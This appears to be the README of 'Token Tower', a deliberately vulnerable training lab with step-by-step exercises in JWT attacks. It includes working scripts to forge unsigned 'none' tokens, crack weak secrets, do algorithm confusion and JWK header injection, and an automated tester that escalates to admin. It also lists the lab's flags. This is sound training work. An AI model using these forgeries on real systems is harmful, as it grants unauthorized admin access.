# 🗼 Token Tower - JWT Vulnerability Lab

A comprehensive JWT (JSON Web Token) security training lab designed for learning and practicing JWT attack techniques. This lab contains multiple intentional vulnerabilities for educational purposes.

## 🎯 Overview

Token Tower simulates a web application with JWT-based authentication that contains several common JWT implementation flaws. Your objective is to exploit these vulnerabilities to escalate privileges from a guest user to admin and capture all the flags.

## 🚀 Quick Start

### Using Docker Compose (Recommended)

```bash
# From the websploit root directory
docker compose up -d token-tower

# Access the lab at:
# http://localhost:5020
# http://10.6.6.40:5020 (from other containers)
```

### Standalone Docker

```bash
cd additional-labs/token-tower
docker build -t token-tower .
docker run -p 5020:5020 token-tower
```

### Direct Python

```bash
cd additional-labs/token-tower
pip install -r requirements.txt
python app.py
```

## 🔓 Vulnerabilities

This lab demonstrates the following JWT vulnerabilities:

| Vulnerability | Description | Difficulty |
|--------------|-------------|------------|
| Weak Secret | JWT signed with a weak, crackable secret | Easy |
| None Algorithm | Server accepts unsigned tokens with `alg: none` | Easy |
| Algorithm Confusion | RS256 to HS256 confusion attack | Medium |
| JWK Header Injection | Inject attacker's public key in JWT header | Hard |
| Claim Manipulation | Modify payload claims after bypassing signature | Easy |

## 🏆 Flags

| Challenge | Flag |
|-----------|------|
| Privilege Escalation | `WEBSPLOIT{PR1V1L3G3_3SC4L4T10N}` |
| None Algorithm | `WEBSPLOIT{JWT_N0N3_4LG0R1THM_BYP4SS}` |
| Weak Secret | `WEBSPLOIT{W34K_S3CR3T_CR4CK3D}` |
| Algorithm Confusion | `WEBSPLOIT{4LG0_C0NFUS10N_M4ST3R}` |
| JWK Injection | `WEBSPLOIT{JWK_1NJ3CT10N_PWN3D}` |
| Master Hacker | `WEBSPLOIT{JWT_M4ST3R_H4CK3R}` |

## 🔑 Test Credentials

| Username | Password | Role |
|----------|----------|------|
| guest | guest | guest |
| user | password123 | user |
| admin | (discover it!) | admin |

---

# Lab Exercises

## Lab 1: Understanding the Token Tower Application

**Objective:** Explore the JWT-based authentication system and identify vulnerabilities.

### Step 1: Access the Application

```bash
# Access via browser
http://localhost:5020

# Or via curl
curl http://localhost:5020
```

### Step 2: Log In and Obtain a JWT

1. Navigate to http://localhost:5020/login
2. Enter username: `guest`
3. Enter password: `guest`
4. Click "Login & Get JWT"

### Step 3: Examine the JWT

After logging in, check your cookies for `auth_token`:

```bash
# Using browser developer tools:
# 1. Open DevTools (F12)
# 2. Go to Application > Cookies
# 3. Find the 'auth_token' cookie

# Or extract via JavaScript console:
document.cookie
```

### Step 4: Decode the JWT

```bash
# Using jwt.io - paste your token at https://jwt.io

# Or use jwt_tool
python3 jwt_tool.py <your_token>

# Or use command line
TOKEN="<your_token>"
echo $TOKEN | cut -d'.' -f1 | base64 -d 2>/dev/null
echo $TOKEN | cut -d'.' -f2 | base64 -d 2>/dev/null
```

**Questions to Answer:**
- What algorithm is used?
- What claims are in the payload?
- What is your assigned role?
- When does the token expire?

---

## Lab 2: None Algorithm Attack

**Objective:** Bypass authentication using the "none" algorithm vulnerability.

### Step 1: Understand the Vulnerability

The application accepts tokens with `"alg": "none"`, which means no signature verification!

### Step 2: Create a Forged Token

```python
#!/usr/bin/env python3
import base64
import json

# Create header with 'none' algorithm
header = {"alg": "none", "typ": "JWT"}

# Create payload with admin role
payload = {
    "user": "attacker",
    "user_id": 999,
    "role": "admin"
}

# Base64URL encode
def b64url_encode(data):
    return base64.urlsafe_b64encode(
        json.dumps(data).encode()
    ).decode().rstrip('=')

# Build token (no signature)
token = f"{b64url_encode(header)}.{b64url_encode(payload)}."
print(f"Forged token: {token}")
```

### Step 3: Use the Forged Token

```bash
# Using curl
curl -b "auth_token=<forged_token>" http://localhost:5020/dashboard

# Or in browser:
# 1. Open DevTools > Application > Cookies
# 2. Modify 'auth_token' value to your forged token
# 3. Refresh the dashboard page
```

### Step 4: Capture the Flag

If successful, you should see the None Algorithm flag on the dashboard!

---

## Lab 3: Weak Secret Attack

**Objective:** Crack the JWT signing secret using dictionary attacks.

### Step 1: Obtain a Valid Token

Log in as `guest` to get a valid HS256-signed JWT.

### Step 2: Crack the Secret

**Using jwt_tool:**
```bash
# Create a wordlist
echo -e "secret\nsecret123\npassword\nadmin\nkey" > wordlist.txt

# Crack the token
python3 jwt_tool.py <token> -C -d wordlist.txt
```

**Using hashcat:**
```bash
# Save token to file
echo "<token>" > jwt.txt

# Crack with hashcat (mode 16500 for JWT)
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

**Using Python:**
```python
import jwt

token = "<your_token>"
wordlist = ["secret", "secret123", "password", "admin", "key", 
           "jwt_secret", "changeme", "123456"]

for word in wordlist:
    try:
        jwt.decode(token, word, algorithms=["HS256"])
        print(f"[+] Found secret: {word}")
        break
    except jwt.InvalidSignatureError:
        print(f"[-] Not: {word}")
```

### Step 3: Forge an Admin Token

```python
import jwt
import datetime

payload = {
    "user": "hacker",
    "user_id": 1337,
    "role": "admin",
    "iat": datetime.datetime.utcnow(),
    "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=24)
}

# Use the cracked secret
token = jwt.encode(payload, "secret123", algorithm="HS256")
print(token)
```

---

## Lab 4: Manual Token Manipulation

**Objective:** Manually craft JWT tokens to understand the structure.

### Step 1: Decode Token Parts

```bash
# Given a token like:
# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCIsInJvbGUiOiJndWVzdCJ9.xxx

# Decode header (first part)
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# Output: {"alg":"HS256","typ":"JWT"}

# Decode payload (second part) - may need padding
echo "eyJ1c2VyIjoidGVzdCIsInJvbGUiOiJndWVzdCJ9==" | base64 -d
# Output: {"user":"test","role":"guest"}
```

### Step 2: Create Modified Token Parts

```bash
# Create new header with 'none' algorithm
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr '/+' '_-' | tr -d '='
# Output: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0

# Create new payload with admin role
echo -n '{"user":"hacker","role":"admin","user_id":1337}' | base64 | tr '/+' '_-' | tr -d '='
# Output: eyJ1c2VyIjoiaGFja2VyIiwicm9sZSI6ImFkbWluIiwidXNlcl9pZCI6MTMzN30
```

### Step 3: Assemble the Token

```bash
# Combine parts (note the trailing dot for 'none' algorithm)
TOKEN="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiaGFja2VyIiwicm9sZSI6ImFkbWluIiwidXNlcl9pZCI6MTMzN30."
echo $TOKEN
```

---

## Lab 5: Using jwt_tool for Comprehensive Testing

**Objective:** Use jwt_tool to perform automated JWT vulnerability testing.

### Step 1: Install jwt_tool

```bash
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool
pip3 install -r requirements.txt
```

### Step 2: Analyze Token

```bash
# Basic analysis
python3 jwt_tool.py <token>

# Verbose output
python3 jwt_tool.py <token> -v
```

### Step 3: Run All Attacks

```bash
# Run all automated tests
python3 jwt_tool.py <token> -M at

# This tests for:
# - None algorithm
# - Algorithm confusion
# - Key injection
# - Signature stripping
```

### Step 4: Interactive Tampering

```bash
# Tamper with token claims interactively
python3 jwt_tool.py <token> -T
```

### Step 5: Generate Forged Tokens

```bash
# Sign with known secret
python3 jwt_tool.py <token> -S hs256 -p "secret123"

# Inject custom claims
python3 jwt_tool.py <token> -I -pc role -pv admin -S hs256 -p "secret123"
```

---

## Lab 6: Algorithm Confusion Attack

**Objective:** Exploit the RS256 to HS256 algorithm confusion vulnerability.

### Step 1: Understand the Attack

When using RS256:
- Server signs with private key
- Server verifies with public key

The attack:
1. Obtain the public key (available at `/public-key`)
2. Change the algorithm to HS256
3. Sign the token using the public key as an HMAC secret
4. Server mistakenly uses the public key to verify the HMAC

### Step 2: Get the Public Key

```bash
# Fetch the public key
curl http://localhost:5020/public-key
```

### Step 3: First, Get an RS256 Token

Log in and select "RS256 (Asymmetric)" from the algorithm dropdown.

### Step 4: Create the Attack

```python
#!/usr/bin/env python3
import jwt

# The public key from /public-key endpoint
PUBLIC_KEY = """-----BEGIN PUBLIC KEY-----
... (paste the actual key) ...
-----END PUBLIC KEY-----"""

# Create admin payload
payload = {
    "user": "confused_admin",
    "user_id": 9999,
    "role": "admin"
}

# Sign with HS256 using the public key
# Note: Some JWT libraries block this, you may need to use older versions
try:
    token = jwt.encode(payload, PUBLIC_KEY, algorithm="HS256")
    print(f"Forged token: {token}")
except Exception as e:
    print(f"Modern libraries prevent this: {e}")
    print("Try using jwt_tool or manual crafting")
```

**Using jwt_tool:**
```bash
# Save public key to file
curl -s http://localhost:5020/public-key | grep -v "^<" > public.pem

# Perform algorithm confusion attack
python3 jwt_tool.py <RS256_token> -X k -pk public.pem
```

---

## Lab 7: JWK Header Injection

**Objective:** Inject your own signing key into the JWT header.

### Step 1: Generate Your Own RSA Key Pair

```python
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
import base64

# Generate key pair
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
    backend=default_backend()
)
public_key = private_key.public_key()

# Get public key numbers for JWK
public_numbers = public_key.public_numbers()

def int_to_base64url(n):
    length = (n.bit_length() + 7) // 8
    return base64.urlsafe_b64encode(n.to_bytes(length, 'big')).decode().rstrip('=')

print(f"n: {int_to_base64url(public_numbers.n)}")
print(f"e: {int_to_base64url(public_numbers.e)}")

# Get private key PEM for signing
private_pem = private_key.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.NoEncryption()
).decode()
print(f"\nPrivate Key:\n{private_pem}")
```

### Step 2: Create JWT with Embedded JWK

```python
import jwt
import json
import base64

# Your generated values
n_value = "your_n_value"
e_value = "AQAB"
private_key_pem = """-----BEGIN PRIVATE KEY-----
... your private key ...
-----END PRIVATE KEY-----"""

# Create header with embedded JWK
header = {
    "alg": "RS256",
    "typ": "JWT",
    "jwk": {
        "kty": "RSA",
        "n": n_value,
        "e": e_value
    }
}

payload = {
    "user": "jwk_injector",
    "user_id": 7777,
    "role": "admin"
}

# Sign with your private key
token = jwt.encode(payload, private_key_pem, algorithm="RS256", headers=header)
print(token)
```

---

## Lab 8: JWT Testing Script

**Objective:** Create a comprehensive JWT testing script.

```python
#!/usr/bin/env python3
"""
JWT Vulnerability Testing Script
For WebSploit Labs Token Tower
"""

import requests
import jwt
import base64
import json

class JWTTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
    
    def get_token(self, username="guest", password="guest"):
        """Login and get a valid token"""
        response = self.session.post(
            f"{self.base_url}/login",
            data={"username": username, "password": password, "algorithm": "HS256"},
            allow_redirects=False
        )
        return self.session.cookies.get('auth_token')
    
    def decode_token(self, token):
        """Decode token without verification"""
        parts = token.split('.')
        # Add padding if needed
        def decode_part(part):
            padding = 4 - len(part) % 4
            if padding != 4:
                part += '=' * padding
            return json.loads(base64.urlsafe_b64decode(part))
        
        header = decode_part(parts[0])
        payload = decode_part(parts[1])
        return header, payload
    
    def test_none_algorithm(self):
        """Test none algorithm vulnerability"""
        print("\n[*] Testing 'none' algorithm attack...")
        
        header = {"alg": "none", "typ": "JWT"}
        payload = {"user": "attacker", "user_id": 9999, "role": "admin"}
        
        def b64url_encode(data):
            return base64.urlsafe_b64encode(
                json.dumps(data).encode()
            ).decode().rstrip('=')
        
        forged = f"{b64url_encode(header)}.{b64url_encode(payload)}."
        
        # Test the forged token
        response = requests.get(
            f"{self.base_url}/dashboard",
            cookies={"auth_token": forged}
        )
        
        if "admin" in response.text.lower() and "flag" in response.text.lower():
            print("[+] VULNERABLE! None algorithm accepted")
            print(f"[+] Forged token: {forged}")
            return True
        else:
            print("[-] None algorithm not accepted")
            return False
    
    def test_weak_secret(self, token, wordlist):
        """Test for weak signing secret"""
        print("\n[*] Testing weak secret...")
        
        for secret in wordlist:
            try:
                jwt.decode(token, secret, algorithms=["HS256"])
                print(f"[+] FOUND SECRET: {secret}")
                return secret
            except jwt.InvalidSignatureError:
                pass
            except jwt.ExpiredSignatureError:
                print(f"[+] FOUND SECRET (token expired): {secret}")
                return secret
        
        print("[-] Secret not found in wordlist")
        return None
    
    def forge_admin_token(self, secret):
        """Create admin token with known secret"""
        import datetime
        payload = {
            "user": "attacker",
            "user_id": 1337,
            "role": "admin",
            "iat": datetime.datetime.utcnow(),
            "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=24)
        }
        return jwt.encode(payload, secret, algorithm="HS256")
    
    def test_api_access(self, token):
        """Test API endpoints with token"""
        print("\n[*] Testing API access...")
        
        headers = {"Authorization": f"Bearer {token}"}
        
        # Test admin endpoint
        response = requests.get(
            f"{self.base_url}/api/admin/flag",
            headers=headers
        )
        
        if response.status_code == 200:
            print(f"[+] Admin API access granted!")
            print(f"[+] Response: {response.json()}")
            return True
        else:
            print(f"[-] Admin API access denied: {response.json()}")
            return False

def main():
    tester = JWTTester("http://localhost:5020")
    
    print("=" * 60)
    print("JWT Vulnerability Tester - Token Tower")
    print("=" * 60)
    
    # Get valid token
    token = tester.get_token()
    if token:
        print(f"\n[+] Got token: {token[:50]}...")
        
        # Decode and display
        header, payload = tester.decode_token(token)
        print(f"[*] Header: {header}")
        print(f"[*] Payload: {payload}")
        
        # Test none algorithm
        tester.test_none_algorithm()
        
        # Test weak secrets
        wordlist = ["secret", "secret123", "password", "admin", "key", 
                   "jwt_secret", "changeme", "123456", "supersecret"]
        secret = tester.test_weak_secret(token, wordlist)
        
        if secret:
            admin_token = tester.forge_admin_token(secret)
            print(f"\n[+] Admin token: {admin_token}")
            tester.test_api_access(admin_token)

if __name__ == "__main__":
    main()
```

---

## Lab 9: Using Burp Suite

**Objective:** Test JWT vulnerabilities using Burp Suite.

### Step 1: Install JWT Extensions

1. Open Burp Suite
2. Go to Extensions > BApp Store
3. Install:
   - **JWT Editor** - Edit JWTs directly in Burp
   - **JSON Web Tokens** - JWT analysis and attacks

### Step 2: Capture JWT Requests

1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to http://localhost:5020
3. Log in as guest
4. Observe the JWT in the `auth_token` cookie

### Step 3: Modify Token in Repeater

1. Right-click request > Send to Repeater
2. In Repeater, use the JWT Editor tab
3. Modify claims (e.g., change role to "admin")
4. Test different attack options:
   - Sign with "none" algorithm
   - Algorithm confusion
   - Remove signature

---

## Lab 10: Defense Implementation

**Objective:** Understand secure JWT implementation.

### Vulnerable Code (Token Tower)

```python
# VULNERABLE - Multiple issues
header = jwt.get_unverified_header(token)
if header.get('alg') == 'none':
    data = jwt.decode(token, options={"verify_signature": False})
```

### Secure Implementation

```python
import jwt
from datetime import datetime, timedelta
import secrets

class SecureJWTAuth:
    def __init__(self):
        # Strong secret (256 bits)
        self.secret = secrets.token_hex(32)
        self.algorithm = "HS256"
    
    def create_token(self, user_id, role):
        payload = {
            "sub": user_id,
            "role": role,
            "iat": datetime.utcnow(),
            "exp": datetime.utcnow() + timedelta(hours=1),
            "jti": secrets.token_hex(16)  # Unique token ID
        }
        return jwt.encode(payload, self.secret, algorithm=self.algorithm)
    
    def verify_token(self, token):
        try:
            return jwt.decode(
                token,
                self.secret,
                algorithms=[self.algorithm],  # Explicit allowlist!
                options={
                    "require": ["exp", "sub", "role", "jti"],
                    "verify_exp": True,
                    "verify_iat": True
                }
            )
        except jwt.ExpiredSignatureError:
            raise ValueError("Token expired")
        except jwt.InvalidTokenError as e:
            raise ValueError(f"Invalid token: {e}")
```

### Key Security Measures

1. **Use strong secrets** (minimum 256 bits of entropy)
2. **Explicitly specify algorithms** - Never trust the header
3. **Validate all claims** (exp, iat, nbf, iss, aud)
4. **Use short expiration times** (15 min - 1 hour)
5. **Implement token revocation** (blacklist, jti tracking)
6. **Don't store sensitive data** in JWT payload

---

## API Reference

### Endpoints

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/` | GET | Home page |
| `/login` | GET, POST | Login page and authentication |
| `/dashboard` | GET | User dashboard (requires auth) |
| `/logout` | GET | Clear authentication |
| `/public-key` | GET | RSA public key (for attacks) |
| `/hints` | GET | Attack hints |
| `/api/docs` | GET | API documentation |
| `/api/auth` | POST | API authentication |
| `/api/verify` | POST | Verify JWT token |
| `/api/user/profile` | GET | User profile (requires auth) |
| `/api/admin/users` | GET | All users (requires admin) |
| `/api/admin/flag` | GET | Admin flag (requires admin) |
| `/.well-known/jwks.json` | GET | JWKS endpoint |

### API Authentication

```bash
# Get a token
curl -X POST http://localhost:5020/api/auth \
  -H "Content-Type: application/json" \
  -d '{"username": "guest", "password": "guest"}'

# Use token in requests
curl http://localhost:5020/api/admin/flag \
  -H "Authorization: Bearer <your_token>"
```

---

## References
To learn more about JWT vulnerabilities and secure coding practices, check out these resources:

- **JWT Debugger**: https://jwt.io
- **jwt_tool**: https://github.com/ticarpi/jwt_tool
- **JWT Security Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html
- **PortSwigger JWT Attacks**: https://portswigger.net/web-security/jwt
- **RFC 7519 (JWT)**: https://datatracker.ietf.org/doc/html/rfc7519

## Additional References

- **Building the Ultimate Cybersecurity Lab and Cyber Range (video)** - [Available on O'Reilly](https://learning.oreilly.com/course/building-the-ultimate/9780138319090/)
- **Build Your Own AI Lab (video)** - [Available on O'Reilly](https://learning.oreilly.com/course/build-your-own/9780135439616)
- **Defending and Deploying AI (video)** - [Available on O'Reilly](https://www.oreilly.com/videos/defending-and-deploying/9780135463727/)
- **AI-Enabled Programming, Networking, and Cybersecurity** - [Available on O'Reilly](https://learning.oreilly.com/course/ai-enabled-programming-networking/9780135402696/)
- **Securing Generative AI** - [Available on O'Reilly](https://learning.oreilly.com/course/securing-generative-ai/9780135401804/)
- **The Art of Hacking** - [Visit The Art of Hacking](https://theartofhacking.org)
- **Hacking Scenarios (Labs) in O'Reilly** - [https://hackingscenarios.com](https://hackingscenarios.com)
- **GitHub Repository** - [Visit GitHub Repo](https://hackerrepo.org)
- **WebSploit Labs** - [Visit WebSploit Labs](https://websploit.org)
- **NetAcad Ethical Hacker Free Course** - [Available (free) on NetAcad Skills for All](https://www.netacad.com/courses/ethical-hacker?courseLang=en-US)